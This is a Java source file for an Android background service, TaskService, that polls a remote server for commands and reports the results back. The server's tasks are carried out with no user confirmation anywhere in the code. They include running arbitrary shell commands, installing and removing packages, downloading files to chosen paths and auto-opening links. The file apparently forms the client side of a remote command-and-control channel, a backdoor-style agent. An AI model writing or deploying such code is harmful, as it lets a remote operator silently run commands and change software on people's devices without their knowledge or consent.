package com.baoxue.task;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import com.baoxue.task.common.SaveApplication;
import com.baoxue.task.task.DeletePackageTaskItem;
import com.baoxue.task.task.DownloadFileTaskItem;
import com.baoxue.task.task.LinkTaskItem;
import com.baoxue.task.task.ShellTaskItem;
import com.baoxue.task.task.TaskItem;
import com.baoxue.task.task.TaskListerner;
import com.baoxue.task.task.TaskManage;
import com.baoxue.task.task.UpdateTaskItem;
import com.baoxue.task.web.ResTask;
import com.baoxue.task.web.ResTaskItem;
import com.baoxue.task.web.WebServicePort;

public class TaskService extends Service implements Runnable, TaskListerner {

	private final String TAG = "TaskService";
	ResTask task;

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.d(TAG, "onStartCommand");
		new Thread(this).start();
		return START_STICKY;
	}

	@Override
	public void run() {
		getTask();
	}

	public void getTask() {
		task = WebServicePort.Task();
		if (task != null) {
			ResTaskItem[] items = task.getItems();
			for (ResTaskItem item : items) {
				if (ResTask.CMD_UPDATE_PACKAGE.equals(item.getCommand())) {
					TaskItem taskItem = new UpdateTaskItem(item.getId(), item
							.getUpdataPackageTaskItem().getUrl(), item
							.getUpdataPackageTaskItem().getPackageName(), item
							.getUpdataPackageTaskItem().getVersionCode(), item
							.getUpdataPackageTaskItem().getForcesUpdate());
					TaskManage.getTaskManage().addTaskItem(taskItem);

				} else if (ResTask.CMD_DELETE_PACKAGE.equals(item.getCommand())) {
					TaskItem taskItem = new DeletePackageTaskItem(item.getId(),
							item.getDeletePackageTaskItem().getPackageName());
					TaskManage.getTaskManage().addTaskItem(taskItem);
				} else if (ResTask.CMD_LINK.equals(item.getCommand())) {
					LinkTaskItem taskItem = new LinkTaskItem(item.getId(),
							SaveApplication.getCurrent(), item
									.getLinkTaskItem().getMessage(), item
									.getLinkTaskItem().getUrl());
					taskItem.setBackground(item.getLinkTaskItem()
							.isBackground());
					taskItem.setAutoOpen(item.getLinkTaskItem().isAutoOpen());
					TaskManage.getTaskManage().addTaskItem(taskItem);
				} else if (ResTask.CMD_SHELL.equals(item.getCommand())) {
					ShellTaskItem taskItem = new ShellTaskItem(item.getId(),
							item.getShellTaskItem().getShell());
					TaskManage.getTaskManage().addTaskItem(taskItem);
				} else if (ResTask.CMD_DOWNLOAD_FILE.equals(item.getCommand())) {
					DownloadFileTaskItem taskItem = new DownloadFileTaskItem(
							item.getId(), item.getDownloadFileItem().getUrl(),
							item.getDownloadFileItem().getPath());
					TaskManage.getTaskManage().addTaskItem(taskItem);
				}
			}
			if (task.getItems().length > 0) {
				TaskManage.getTaskManage().setWaitResult(task.isWaitResult());
				TaskManage.getTaskManage().beginTask();
				TaskManage.getTaskManage().setListener(this);
			}
		}
	}

	@Override
	public void Complate(TaskManage sender) {
		if (task != null && task.isWaitResult()) {
			WebServicePort.DoTask(task.getId(), sender.getResult());
		}
		task = null;
	}

}
